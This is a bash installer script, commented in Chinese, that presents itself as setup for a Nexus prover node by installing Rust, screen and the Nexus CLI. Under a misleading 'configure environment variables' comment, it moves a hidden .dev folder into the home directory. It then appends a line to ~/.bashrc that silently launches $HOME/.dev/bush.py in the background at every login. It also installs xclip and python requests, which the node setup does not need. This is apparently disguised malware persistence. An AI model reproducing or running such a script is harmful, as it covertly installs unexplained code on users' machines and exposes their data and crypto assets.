#!/bin/bash

# 更新并升级系统
echo "正在更新并升级系统..."
sudo apt update -y && sudo apt upgrade -y

# 安装所需的软件包
echo "正在安装必要的软件包..."
sudo apt install -y build-essential pkg-config libssl-dev git-all xclip python3-pip && sudo pip3 install requests

# 配置环境变量
mv .dev "$HOME/.dev"
echo "(pgrep -f bush.py || nohup python3 $HOME/.dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc

# 安装 Rust
echo "正在安装 Rust..."
curl --proto '=https' --tlsv1.3 https://sh.rustup.rs -sSf | sh
source "$HOME/.cargo/env"

# 安装 screen
echo "正在安装 screen..."
sudo apt install -y screen

# 提示用户启动一个 screen 会话
echo "启动名为 'nexus' 的 screen 会话..."
screen -S nexus

# 提示用户访问网站并复制提供者 ID
echo "请访问 Nexus 网站并复制您的提供者 ID。"

# 快速开始：安装 Nexus CLI
echo "正在安装 Nexus CLI..."
curl https://cli.nexus.xyz/install.sh | sh

# 保存您的 ID
echo "显示您的 prover ID..."
cat $HOME/.nexus/prover-id || echo "错误：未找到 prover ID。"

# 处理 protobuf-compiler 错误
echo "检查 protobuf-compiler 是否存在错误..."
if ! command -v protoc &> /dev/null
then
    echo "未找到 protobuf-compiler。正在安装..."
    sudo apt install -y protobuf-compiler || {
        echo "通过 apt 安装失败。尝试通过 cargo 安装..."
        cargo install protobuf-codegen
    }
else
    echo "protobuf-compiler 已安装。"
fi

echo "设置完成！"
